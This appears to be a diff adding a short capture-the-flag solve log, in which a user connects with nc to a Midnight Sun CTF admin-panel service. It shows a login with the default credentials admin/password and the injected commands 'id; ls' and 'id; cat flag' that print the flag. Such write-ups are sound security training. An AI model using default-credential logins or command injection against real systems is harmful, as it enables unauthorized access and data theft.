@@ -1,0 +1,23 @@
+$ nc admpanel-01.play.midnightsunctf.se 31337
+---=-=-=-=-=-=-=-=-=---
+-      Admin panel    -
+-
+- [0] - Help
+- [1] - Authenticate
+- [2] - Execute command
+- [3] - Exit
+---=-=-=-=-=-=-=-=-=---
+ > 1
+  Input username: admin
+  Input password: password
+ > 2
+  Command to execute: id; ls
+uid=999(ctf) gid=999(ctf) groups=999(ctf)
+chall
+flag
+redir.sh
+ > 2
+  Command to execute: id; cat flag
+uid=999(ctf) gid=999(ctf) groups=999(ctf)
+midnight{n3v3r_4sk_b0bb_to_d0_S0m3TH4Ng}
+
